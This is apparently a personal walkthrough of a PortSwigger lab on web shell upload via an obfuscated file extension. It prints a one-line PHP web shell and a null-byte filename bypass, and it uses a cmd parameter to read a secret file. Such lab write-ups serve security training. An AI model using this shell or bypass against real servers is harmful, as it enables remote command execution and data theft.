---
Category: File upload
LAB: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
Difficulty: Practitioner
Featured:
---
---

# Information / Description

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

---

# Walkthrough

Go into the login page and  login

Then upload the avatar but upload this `php` instead

```
<?php system($_GET['cmd']);?>
```

![](../../../0.%20Assets/Web%20shell%20upload%20via%20obfuscated%20file%20extension-1784720518555.webp)

Open Burp and get the request and send to `repeater`

![](../../../0.%20Assets/Web%20shell%20upload%20via%20obfuscated%20file%20extension-1784720658323.webp)

Send it and we get the following error

![](../../../0.%20Assets/Web%20shell%20upload%20via%20obfuscated%20file%20extension-1784719053158.webp)

so change the name of the file and add the `NULL byte` at the end and `.jpg`

`%00`

![](../../../0.%20Assets/Web%20shell%20upload%20via%20obfuscated%20file%20extension-1784720684293.webp)

This obfuscates the reals extension of the file because the server stops reading the extension after the null byte but still recognizes it as `.jpg `when uploading

Now we just open `/files/avatars/shell-cmd.php` (by default it opens with `%00.jpg` so just remove that part)

![](../../../0.%20Assets/Web%20shell%20upload%20via%20obfuscated%20file%20extension-1784720730024.webp)

and pass our commands through the `cmd` parameter

```
?cmd=cat /home/carlos/secret
```

![](../../../0.%20Assets/Web%20shell%20upload%20via%20obfuscated%20file%20extension-1784720778230.webp)

```
EDg5ocVt3XCy4RYUVbLj9b6u6o8ctDiL
```

Now just submit the solution

![](../../../0.%20Assets/Web%20shell%20upload%20via%20obfuscated%20file%20extension-1784720807948.webp)